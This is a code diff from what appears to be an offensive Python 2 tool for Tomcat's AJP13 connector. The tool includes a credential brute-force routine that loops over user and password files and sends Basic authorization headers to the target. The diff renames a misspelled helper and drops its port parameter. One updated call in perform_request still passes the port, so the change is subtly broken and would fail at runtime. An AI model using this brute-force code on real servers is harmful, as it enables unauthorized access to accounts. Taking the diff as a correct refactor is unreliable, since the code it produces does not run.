@@ -52,7 +52,7 @@ logger = setup_logger()
 
 
 # helpers
-def prepare_ajp_forware_request(target_host, target_port, req_uri, method=AjpForwardRequest.GET):
+def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
 	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
 	fr.method = method
 	fr.protocol = "HTTP/1.1"
@@ -121,7 +121,7 @@ class Tomcat(object):
 	def start_bruteforce(self, users, passwords, req_uri, autostop):
 		logger.info("Attacking a tomcat at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
 		self.req_uri = req_uri
-		self.forward_request = prepare_ajp_forware_request(self.target_host, self.target_port, self.req_uri)
+		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)
  	 
 		f_users = open(users, "r")
 		f_passwords = open(passwords, "r")
@@ -149,7 +149,7 @@ class Tomcat(object):
 
 	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
 		self.req_uri = req_uri
-		self.forward_request = prepare_ajp_forware_request(self.target_host, self.target_port, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
+		self.forward_request = prepare_ajp_forward_request(self.target_host, self.target_port, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
 		logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
 		if user is not None and password is not None:
 			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
